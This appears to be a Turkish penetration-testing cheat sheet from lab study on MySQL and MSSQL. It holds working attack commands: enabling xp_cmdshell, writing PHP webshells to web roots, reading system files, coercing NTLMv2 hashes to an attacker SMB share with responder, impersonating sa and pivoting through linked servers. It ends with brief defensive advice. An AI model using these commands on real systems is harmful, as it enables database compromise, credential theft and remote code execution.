# sql

`MySQL` ve Microsoft SQL Server (`MSSQL`), verileri tablo, sütun ve satırlar halinde depolayan ilişkisel veritabanı yönetim sistemleridir.



+ `MySQL` ` TCP/3306` numaralı portu kullanır. Ancak `MSSQL` hidden modda ` TCP/2433` numaralı portu kullanır. 
+ `MSSQL`,` TCP/1433` ve `UDP/1434` numaralı portları kullanır

---

> [!TIP] Kullanıcının sahip olduğu ayrıcalıklara bağlı olarak, bir SQL Server üzerinde aşağıdakiler gibi çeşitli işlemler gerçekleştirebiliriz:
>  + [ ] Veritabanı içeriğini okuma veya değiştirme
>  + [ ] Sunucu yapılandırmasını okuma veya değiştirme
>  + [ ] Komut yürütme
>  + [ ] Yerel dosyaları okuma
>  + [ ]  Diğer veritabanlarıyla iletişim kurma
>  + [ ]  Yerel sistem özet değerini (hash) ele geçirme
>  + [ ]  Mevcut kullanıcıların kimliğine bürünme
>  + [ ] Diğer ağlara erişim sağlama

## Enumeration

### nmap

```bash
nmap -Pn -sV -sC -p1433 10.10.10.125
```


## Connect Mysql Linux

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```
## Connect Mysql windows

```bash
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
> [!NOTE] sqlcmd kullanarak MSSQL'de kimlik doğrulaması yaptığımızda, daha düzgün görünen bir çıktı elde etmek için -y 
**`-y`** SQL CMD MAX VAR TYPE WIDTH
**`-Y`** SQL CMD MAX FIXED TYPE WIDTH

### Eğer `MSSQL`'yi Linux'tan bağlanacaksak `impacket-mssqlclient`'yi veya `sqsh`  kullanabiliriz:

```bash
impacket-mssqlclient -p 1433 julio@10.129.203.7 
```

**Yada**

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
+ `-h` **Daha Düzgün Görünmesi İçin***
- **Windows Authentication:** Domain adı veya hedef hostname belirtilirse kullanılır.
- **SQL Authentication:** Domain veya hostname verilmezse, SQL Server içinde tanımlı kullanıcılar kullanılır.
- **Yerel hesap:** `SERVERNAME\accountname` veya `.\accountname` şeklinde yazılır.


## Kimlik ve Yetki Kontrolü

| Komut | Ne yapar | Kullanımı |
|-------|----------|-----------|
| `SELECT SYSTEM_USER` | Bağlı login adını gösterir | `SELECT SYSTEM_USER` |
| `SELECT IS_SRVROLEMEMBER('sysadmin')` | Login'in sysadmin olup olmadığını gösterir (1/0) | `SELECT IS_SRVROLEMEMBER('sysadmin')` |
| `SELECT IS_SRVROLEMEMBER('<rol>')` | Belirtilen sunucu rolünde olup olmadığını gösterir | `SELECT IS_SRVROLEMEMBER('serveradmin')` |
| `SELECT USER_NAME()` | Mevcut veritabanındaki kullanıcı adını gösterir | `USE master` sonrası `SELECT USER_NAME()` |

## Veritabanı ve Nesne Keşfi

| Komut | Ne yapar | Kullanımı |
|-------|----------|-----------|
| `SELECT name FROM sys.databases` | Sunucudaki veritabanlarını listeler | `SELECT name FROM sys.databases` |
| `USE <veritabanı>` | Aktif veritabanını değiştirir | `USE msdb` |
| `SELECT name FROM sys.tables` | Aktif veritabanındaki tabloları listeler | `USE <db>` sonrası çalıştır |
| `SELECT name FROM sys.objects WHERE type='U'` | Kullanıcı tablolarını listeler | Aktif veritabanında çalıştır |
| `EXEC sp_helpdb` | Veritabanı ayrıntılarını (boyut, sahip) gösterir | `EXEC sp_helpdb` |
| `EXEC sp_databases` | Erişilebilen veritabanlarını listeler | `EXEC sp_databases` |

## Login, Kullanıcı ve Rol Bilgisi

| Komut | Ne yapar | Kullanımı |
|-------|----------|-----------|
| `EXEC sp_helplogins` | Sunucudaki login'leri ve eşlemelerini gösterir | `EXEC sp_helplogins` |
| `EXEC sp_helpuser` | Aktif veritabanındaki kullanıcıları gösterir | `USE <db>` sonrası çalıştır |
| `EXEC sp_helpsrvrolemember` | Sunucu rollerinin üyelerini gösterir | `EXEC sp_helpsrvrolemember` |
| `EXEC sp_helprolemember` | Veritabanı rollerinin üyelerini gösterir | `USE <db>` sonrası çalıştır |
| `SELECT * FROM sys.server_principals` | Sunucu düzeyindeki principal'ları listeler | Tümünü ya da `WHERE type_desc='SQL_LOGIN'` ile filtrele |
| `SELECT * FROM sys.server_permissions` | Sunucu düzeyindeki izinleri listeler | `grantee_principal_id` ile join yapılarak okunur |

## Yetki ve Taklit (Impersonation)

| Komut | Ne yapar | Kullanımı |
|-------|----------|-----------|
| `SELECT ... FROM sys.server_permissions ... WHERE permission_name='IMPERSONATE'` | Taklit izinlerini gösterir | Grantee tarafına join yaparak okunur |
| `EXECUTE AS LOGIN = '<login>'` | Başka bir login olarak çalışmaya geçer | Önce `USE master`, sonra çalıştır |
| `REVERT` | `EXECUTE AS` ile geçilen kimliği bırakır | Yetkiyi geri almak için kullanılır |

## Komut Çalıştırma ve Sistem Erişimi

| Komut | Ne yapar | Kullanımı |
|-------|----------|-----------|
| `EXEC sp_configure 'show advanced options', 1` + `RECONFIGURE` | Gelişmiş seçenekleri açar (sysadmin gerekir) | Önce bu, sonra aşağıdaki |
| `EXEC sp_configure 'xp_cmdshell', 1` + `RECONFIGURE` | `xp_cmdshell`'i etkinleştirir | Sysadmin gerekir |
| `EXEC xp_cmdshell '<komut>'` | İşletim sistemi komutu çalıştırır | `EXEC xp_cmdshell 'whoami'` |
| `EXEC master..xp_dirtree '\\<IP>\<paylaşım>'` | Belirtilen UNC yoluna erişim tetikler | Ağ erişimi testinde kullanılır |
| `EXEC master..xp_regread '<hive>', '<yol>', '<değer>'` | Registry değerini okur | Yetki gerektirir |
| `EXEC master..xp_regwrite ...` | Registry'ye yazar | Sysadmin gerektirir, yetki yükseltmede kullanılır |

## Linked Server

| Komut | Ne yapar | Kullanımı |
|-------|----------|-----------|
| `SELECT srvname, isremote FROM sysservers` | Tanımlı sunucuları listeler (`isremote=0` linked server) | `SELECT srvname, isremote FROM sysservers` |
| `EXECUTE('<sorgu>') AT [<sunucu>]` | Linked server üzerinde sorgu çalıştırır | Tek tırnak için `''` kullanılır |

## SQL Agent ve Credential

| Komut | Ne yapar | Kullanımı |
|-------|----------|-----------|
| `SELECT name, credential_identity FROM sys.credentials` | Kayıtlı credential'ları listeler | `USE master` sonrası çalıştır |
| `SELECT j.name, s.step_name, s.command FROM msdb.dbo.sysjobs j JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id` | Job adlarını ve adım komutlarını gösterir | Tek satırda yaz |

## Genel Oturum Komutları

| Komut | Ne yapar | Kullanımı |
|-------|----------|-----------|
| `SELECT @@VERSION` | SQL Server sürümünü gösterir | `SELECT @@VERSION` |
| `SELECT @@SERVERNAME` | Sunucu adını gösterir | `SELECT @@SERVERNAME` |
| `SELECT SERVERPROPERTY('IsIntegratedSecurityOnly')` | Sadece Windows Auth modunda mı olduğunu gösterir (1/0) | `SELECT SERVERPROPERTY('IsIntegratedSecurityOnly')` |
| `EXIT` / `QUIT` | sqsh oturumunu kapatır | `EXIT` |



```bash
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

## SQL Databases

MySQL ve MSSQL için varsayılan veritabanlarını bilmek önemlidir. Bu veritabanları, veritabanının kendisine dair bilgileri barındırır ve veritabanı adlarını, tabloları, sütunları vb. listeleyebilmemize olanak tanır. **Ancak bunlar genellikle şirkete ait verileri içermez.**


###  MySQL varsayılan sistem şemaları/veritabanları:

+ **mysql** - MySQL sunucusunun gerektirdiği bilgileri depolayan tabloları içeren sistem veritabanıdır
+  **information_schema** - veritabanı meta verilerine erişim sağlar
+  **performance_schema** - MySQL Sunucusu'nun çalışma sürecini düşük seviyede izlemeye yarayan bir özelliktir
+  **sys** - veritabanı yöneticilerinin (DBA) ve geliştiricilerin, Performance Schema tarafından toplanan verileri anlamlandırmasına yardımcı olan bir nesneler bütünüdür


###  MSSQL varsayılan sistem şemaları/veritabanları:

+  **master** - Bir SQL Server örneğine ait bilgileri tutar.
+  **msdb** - SQL Server Agent tarafından kullanılır.
+  **model** - Her yeni veritabanı için kopyalanan bir şablon veritabanıdır.
+  **resource** - Sunucudaki her veritabanında, `sys` şeması altında sistem nesnelerinin görünür olmasını sağlayan, salt okunur bir veritabanıdır.
+  **tempdb** - SQL sorguları için geçici nesneleri tutar.

### Sql Syntax

#### MySQL


**Show Dbs**
```sql
SHOW DATABASES;


+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
```

**Select Datase**

```sql
USE htbusers;
```

**Show Tables**

```sql
SHOW TABLES;
```
**Select all Data from Table "users"**

```sql
selecet * from users;
```

#### MSSQL


**Show Dbs**
```sql
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

**Select Datase**

```sql
USE htbusers
GO
```

**Show Tables**

```sql
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
```

**Select all Data from Table "users"**

```sql
SELECT * FROM users
GO
```


### Command Execution

#### MsSQL

##### `XP_CMDSHELL`



```sql
xp_cmdshell 'whoami'
GO

no service\mssql$sqlexpress
```

**xp_cmdshell** eğer etkin Değilse sırayla çalıştırıcaz

```sql
EXECUTE sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO 

EXECUTE sp_configure 'xp_cmdshell', 1
GO 

RECONFIGURE
GO

```
##### MSSQL'de `xp_cmdshell` Dışında Komut Çalıştırma Yöntemleri

`xp_cmdshell` kapalıysa veya kullanılamıyorsa, MSSQL üzerinde komut çalıştırmak için başka yollar da var.

## Yöntemler

- **[Extended Stored Procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server):** SQL Server'a eklenen harici DLL tabanlı prosedürler. Ekleme yöntemi Microsoft dokümanında anlatılıyor.
- **[CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration):** SQL Server içinde .NET kodu (assembly) çalıştırmaya yarar. CLR entegrasyonu üzerinden çalışır.
- **[SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15):** Zamanlanmış görevler; bir job içinde işletim sistemi komutu adımı tanımlanabilir.
- **[External Scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql):** `sp_execute_external_script` ile R, Python gibi harici dillerde script çalıştırma.

## Yetki Yükseltme

- **xp_regwrite:** Windows kayıt defterine (registry) yeni girdi yazarak yetki yükseltmeye yardımcı olabilir.

### MSSQL kullanarak dosya yazmak için

1. MSSQL - Ole Automation Procedures'u Etkinleştirme

```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```
2. MSSQL - Create a File

```sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO

```

### MSSQL kullanarak dosya okumak için

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

### MSSQL Service  `XP_SUBDIRS` Hash Çalma

**Altetrnative tool:**
` XP_DIRTREE` Hash Çalma
```sql
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```

#### XP_SUBDIRS

##### 1 
```sql
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```
##### 2 Ağ Trafiğini Yakalama `responder`

```bash
responder -I tun0


[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```
+  Ağ Trafiğini Yakalama `impacket-smbserver`

```bash
impacket-smbserver share ./ -smb2support


[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)              
```

##### 3. Hashi Aldık  MSSQL ile Mevcut Kullanıcıların Kimliğine Bürünme `IMPERSONATE`

**Kullanıcıyı Taklit Edebileceğimizi Belirleyin**

```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO


name
-----------------------------------------------
sa
ben
valentin

```

**yukarıdaki çıktıda  `sa`, `ben` ve `valentin` Taklit etme iznini veren taraf;**

##### 4. Mevcut Kullanıcımızı ve Rolümüzü Doğrulama

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go

-----------
julio   

(1 rows affected)

-----------
          0
```

**`0`** döndüğü için sistem **sysadmin rolüne sahip değil  ancak `sa` kullanıcısının kimliğine bürünebileceğimizi gösterir.**


##### 5.  Şimdi `sa` kullanıcının kimliğine bürünelim ve aynı komutları çalıştıralım

```sql
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
-----------
sa
(1 rows affected)
-----------
          1
```

**Dönen `1` değeri, artık bir sistem yöneticisi `sysadmin` olarak dilediğimiz komutu yürütebileceğimizi göstermektedir.**


**Not: `EXECUTE AS LOGIN` komutunu `master` veritabanı içinde çalıştırmanız önerilir; çünkü tüm kullanıcılar varsayılan olarak bu veritabanına erişim hakkına sahiptir. Kimliğine bürünmeye çalıştığınız kullanıcının, bağlantı kurduğunuz veritabanına erişim yetkisi yoksa bir hata alırsınız. `USE master` komutunu kullanarak `master` veritabanına geçmeyi deneyin.**



```sql
USE master
GO

EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```


**Yetkiyi geri almak için:**

```sql
REVERT
GO
```

**Not: Sistem yöneticisi (sysadmin) olmayan bir kullanıcı tespit edersek, söz konusu kullanıcının başka veritabanlarına veya bağlantılı sunuculara (linked servers) erişimi olup olmadığını yine de kontrol edebiliriz.**






---
#### MySQL

##### MySQL - Write Local File


```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

**MySQL'de, `secure_file_priv` adlı genel sistem değişkeni; `LOAD DATA` ve `SELECT … INTO OUTFILE` ifadeleri ile `LOAD_FILE()` işlevi gibi veri içe ve dışa aktarma işlemlerinin kapsamını sınırlar. Bu işlemler, yalnızca `FILE` ayrıcalığına sahip kullanıcılar tarafından gerçekleştirilebilir.**


### `secure_file_privsecure_file_priv` şu şekilde ayarlanabilir:

+ **Boş bırakılırsa** değişkenin hiçbir etkisi olmaz; bu, güvenli bir ayar değildir.
+ **Bir dizin adı olarak ayarlanırsa**, sunucu içe ve dışa aktarma işlemlerini yalnızca bu dizindeki dosyalarla sınırlandırır. Söz konusu dizin mevcut olmalıdır; sunucu onu kendiliğinden oluşturmaz.
+ **NULL** olarak ayarlanırsa, sunucu içe ve dışa aktarma işlemlerini devre dışı bırakır.


### `secure_file_priv` yetki kontrol etme

```sql
show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

### Local Dosya Okuma `LOAD_FILE`

```sql
select LOAD_FILE("/etc/passwd");
```


### MSSQL Linked Servers ile Diğer Veritabanlarına Erişim

Linked server, bir SQL Server'ın başka bir SQL Server (veya Oracle gibi farklı bir veritabanı) üzerindeki tablolara Transact-SQL ile erişmesini sağlayan yapılandırmadır. Bir SQL Server'a erişim sağlarsan, linked server üzerinden yanal hareket (lateral movement) mümkün olabilir.

Önemli nokta: Linked server, uzak sunucuya tanımlanmış kimlik bilgileriyle bağlanır. Bu kimlik bilgileri sysadmin yetkisine sahipse, uzak SQL instance'ında komut çalıştırmak mümkün olabilir.

## Linked Server'ları Bulma

```sql
SELECT srvname, isremote FROM sysservers
GO
```

| Sütun | Anlamı |
|-------|--------|
| `srvname` | Sunucu adı |
| `isremote` | `1` = uzak sunucu, `0` = linked server |

## Linked Server Üzerinde Sorgu Çalıştırma

`EXECUTE` ile pass-through komut gönderilir; sorgu parantez içine, linked server adı köşeli parantez içine yazılır.

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```

- Tek tırnak içinde tırnak kullanmak için çift tek tırnak (`''`) kullanılır.
- Birden fazla komut noktalı virgül (`;`) ile ayrılır.

## Özet

- Sysadmin yetkisiyle linked server üzerinde sorgu çalıştırılabiliyorsa, uzak SQL Server kontrol altına alınmış olur.
- Bu ortamda veri okunabilir, herhangi bir veritabanına erişilebilir ve `xp_cmdshell` ile sistem komutu çalıştırılabilir.

## Savunma

- Gereksiz linked server tanımlarını kaldırmak.
- Linked server'larda düşük yetkili, sysadmin olmayan kimlik bilgileri kullanmak.
- `xp_cmdshell` ve `sp_configure` gibi yetkileri kısıtlamak.
